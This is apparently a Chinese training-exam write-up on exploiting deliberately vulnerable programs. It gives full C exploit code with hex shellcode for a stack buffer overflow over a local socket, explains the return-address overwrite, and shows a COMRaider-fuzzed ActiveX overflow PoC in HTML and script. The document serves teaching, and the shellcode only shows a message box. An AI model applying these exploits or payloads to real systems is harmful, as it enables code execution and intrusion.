
`"\x53\x68\x69\x6e\x64\x21\x68\x6e\x65\x74\x77\x8B\xC4\x53\x50\x50"`

`"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"`;

```c
int main()
{
  char buffer[1000];
  int i=0;
  memset(buffer,0,sizeof(buffer)-1);
  for(i=0;i<200;i++)
    strcpy(buffer+i,"A"); //前面放 200 字节字符串，放什么都可以别放 0 就好。
  strcpy(buffer+i,jump_addr); //然后放跳转指令地址
  strcpy(buffer+i+4,shellcode); //然后放我们的 shellcode
  WSADATA wsa;
  WSAStartup(MAKEWORD(2,0),&wsa);
  SOCKET s,s1;
  struct sockaddr_in target;
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=inet_addr("127.0.0.1");
  target.sin_port=htons(7777);
  s=socket(AF_INET,SOCK_STREAM,0);
  connect(s,(struct sockaddr *)&target,sizeof(target));
  Sleep(1000);
  send(s,buffer,sizeof(buffer),0);   //send result; 发串了
  Sleep(1000);
  WSACleanup();
  return 1;
}
```

Exploit 很简单，没什么需要解释的。我说明下跳转指令地址是用 `od` 插件 搜索的在 `kernel32.dll` 里的地址，另外根据 `failwest` 老师的说明，该考试用来提高大家漏洞分析能力的，不是专门针对编写 shellcode 的，所以嘛，我就把 `failwest` 老师的精悍的 shellcode 拿来用了，当学生我是最听老师话了，老师怎么说就怎么做嘛，呵呵。

我引用 shellcode 时把弹出的名字改为了自己在 `pediy` 的 id。

//
// 此方式的问题就是不通用。
// 下面我们继续找出一种更通用的利用方式：
// 我们用 `od` 加载目标程序 让其运行到 `call 401000` 函数的返回地址处停下如图所示：

![名称:  3.jpg> 查看次数: 159> 文件大小:  17.3 KB](img/4c7ecc1393e751d87ff3cd8a50a36de0.jpg)

这个是指令窗口停在 函数返回指令上，该返回指令可以被我们覆盖。
![名称:  4.jpg> 查看次数: 161> 文件大小:  15.1 KB](img/479445be3ee1cda0055ca847f2c7e12a.jpg)

这个是这时的堆栈窗口。
其中 `12fbb8` 的地方就是子函数返回地址所在地方，我这里已经用地址 `4010a4` 把它覆盖了

我们看到 `12fbbc` 处 的值是 `12fbf4`

我们再看看 `12fbf4` 指向的是什么内容：
![名称:  5.jpg> 查看次数: 158> 文件大小:  18.5 KB](img/feff3d88ffba640e7da92fba7afe8251.jpg)

这个是堆栈 `12fbf4` 的内容 这个地址 就是 `recv` 接收我们的串时 把串存放的地址，呵呵。

这里我改变了串的构造方式 ，格式为：`shellcode+AAAA+jum_addr.`。

我们只要把返回地址处指令覆盖为 `retn` 的地址 ，那么函数返回时 就直接跳到 `12fbf4` 所指的指令去执行了，这时 `12fbf4` 放的是我们的 `shellcode` 那么我们 `shellcode` 就顺利执行了。

那么我们只需在程序代码找个 `retn` 返回地址就可以了
![名称:  6.jpg> 查看次数: 159> 文件大小:  7.5 KB](img/fe982cd0d9f7b62875fe9cdb829bc7fa.jpg)

其实眼前就有个 这里我选的是 `004010a4`。

字符串复制时，遇 0 会断掉，但这里我们已经可以成功把返回地址覆盖了，所以它把 `4010a4` 复制进去就断了，刚好覆盖了返回地址，达到目的了。

好了，修改后的 exploit 如下：

```c
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#define jump_addr "\\xa4\\x10\\x40"
char shellcode[] =
"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C"
"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53"
"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B"
"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95"
"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59"
"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A"
"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75"
"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03"
"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB"
"\\x53\\x68\\x69\\x6e\\x64\\x21\\x68\\x6e\\x65\\x74\\x77\\x8B\\xC4\\x53\\x50\\x50"
"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8";
int main()
{
  char buffer[0x2000];
  int i=0,j;
  strcpy(buffer,shellcode);
  for(i=0;i+sizeof(shellcode)-1<200;i++)
    strcpy(buffer+i+sizeof(shellcode)-1,"A");
  strcpy(buffer+i+sizeof(shellcode)-1,jump_addr);
  WSADATA wsa;
  WSAStartup(MAKEWORD(2,0),&wsa);
  SOCKET s,s1;
  struct sockaddr_in target;
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=inet_addr("127.0.0.1");
  target.sin_port=htons(7777);
  s=socket(AF_INET,SOCK_STREAM,0);
  connect(s,(struct sockaddr *)&target,sizeof(target));
  Sleep(1000);
  send(s,buffer,sizeof(buffer),0);   //send result;
  Sleep(1000);
  WSACleanup();
  return 1;
}
```

我讲在下面 “稳定性与通用性论证” 一栏介绍为什么选 `004010a4` 这个地址具有通用性。

shellcode 描述：
该 `shellcode` 被成功执行时弹出方框，然后退出。

原 `shellcode` 代码为：
`"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C"`
`"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53"`
`"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B"`
`"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95"`
`"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59"`
`"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A"`
`"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75"`
`"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03"`
`"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB"`
`"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50"`
`"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8";`

exploit 运行截图
![名称:  7.jpg> 查看次数: 157> 文件大小:  44.5 KB](img/e26021ce5de8f1fc2170309125a5dd16.jpg)

Exploit 修改前运行效果图
![名称:  8.jpg> 查看次数: 157> 文件大小:  34.7 KB](img/2e8229610820b7b7089629f34f8d437e.jpg)

Exploit 修改后运行效果图

### 稳定性与通用性论证

一开始我们用 `kernel32.dll` 里的 `jmp esp` 的地址，`kernel32.dll` 由于版本，是否打补丁等影响，不同机器里的可能不一样，这样 `jmp esp` 的地址就不一定会相同，这样 `exploit` 可能就会执行失败。

而选用程序本身的地址 `004010a4` 时，程序由系统加载其所用函数地址，指令地址都是由 `pe` 结构动态获得的，因此只要 `pe` 程序能正常运行，它自身的地址便是通用的。

### 创新性论证（可选）

一般，由于 `pe` 加载基地址从 `0x00400000` 开始，必然包含 `0`，而字符串 `copy` 时，遇 `0` 便会中断 `copy` ，那样我们构造的串就不能顺利植入目标程序，而系统地址 不包括 `0`，可以使用，但又不具有通用性。

在这里由于目标程序刚好再 200 字节后是返回地址，我们的 `shellcode` 低于 200 字节，我们把 `shellcode` 放在前面，200 字节后放目标程序里的跳转地址，且能跳到 `shellcode`，我们就只需要这么多串就足够了，所以对于本环境来说第二种方式具有很好的通用性，是一种较好的利用方式。

//////////////////////////
**B 题分析:**

在这里我用的是 `comraider` 来发掘 `com` 组件的漏洞,我们用 `comraider` 打开 `exploit_me_B.dll` 然后选择所列出的一个函数 点右键 选择 `fuzz memory`,一般参数带有字符串的函数 可能存在溢出漏洞,这里我选择的是 `loadpage` 函数.如图
![名称:  11.jpg> 查看次数: 143> 文件大小:  61.5 KB](img/c3e25a43df870c40a0a906ce5ffc157f.jpg)

然后点 `next` ,点 `begin fuzz`.

刚开始 时 我总是遇到一个错误提示框 如图
![名称:  22.jpg> 查看次数: 141> 文件大小:  21.1 KB](img/91598b23f101c3d3ba0aa95687094b8a.jpg)

老是搞不明白是什么问题,浪费了很多时间,其实是这样的，比如我注册 `exploit_me_B.dll` 时用的路径是 `d:\\ exploit_me_B.dll`,但我用 `comraider` 打开的却是桌面上放的 `exploit_me_B.dll`,就有这个错误了,不知道是否有朋友遇到类似情况,只要打开注册时 所在路径的 `dll` 就可以了.

下面是点 `begin fuzz` 后的运行结果.
![名称:  33.jpg> 查看次数: 142> 文件大小:  34.0 KB](img/0d9852a028adbfd83a0c1871b2e05656.jpg)

显示出有很多处异常,有异常就有可能有被利用的可能,这里我们对第一个 点右键,选择在 `ie` 测试运行结果如图:
![名称:  44.jpg> 查看次数: 141> 文件大小:  25.9 KB](img/fd61b2217865683d18db194ad08909f6.jpg)

`Ie` 崩溃了 ,下面我们看看 它是否能被利用.

`Comraider` 的确是个好工具 测试的 `poc` 代码也顺便给出来了.

对第一个异常所在行点右键选择 `view file` 就可以看到代码.

其中有用部分为:
```html
<object classid='clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2' id='target' />
<script language='vbscript'>
arg1=String(1044, "A")
arg2=1
arg3=1
arg4=1
target.LoadPage arg1 ,arg2 ,arg3 ,arg4
</script>
```

对应 `javascript` 代码为:
```html
<object id="target" classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2"></object>
<script language="javascript">
//Var arg1=String(1044, "A");//这里 javascript 没这个函数,开始时,我用这个函数,又浪费了我 n 多时间.
var arg1="AAAAAAAAAA";
while(arg1.length<1044)arg1+=arg1;          //这里放个超长串.
var arg2=1;
var arg3=1;
var arg4=1;
target.LoadPage(arg1,arg2,arg3,arg4);
</script>
```
好了保存为 `1.htm` 就是测试代码了.

好了,现在我们定位溢出点.

用 `od` 加载 `iexplorer.exe` 并运行,等运行出 `ie` 后 打开我们构造的 `1.htm`

`Ie` 这时如图:
![名称:  55.jpg> 查看次数: 142> 文件大小:  36.2 KB](img/6c58673de63d26b37e3aabb5cf050501.jpg)

然后在 `od` 里 按 `alt+e` 找到 `oleaut32.dll` 模块双击,然后再按 `ctrl+n` 找到 `DispCallFunc` 按 `f2` 设断 然后在 `ie` 里 对提示限制显示 那块点右键选择 允许阻止的内容

然后 `od` 就会断 到 `DispCallFunc` 处,`f8` 跟进 直到 出现 `call ecx` 时,`f7` 进去.

这时就来到 `loadpage` 入口了。
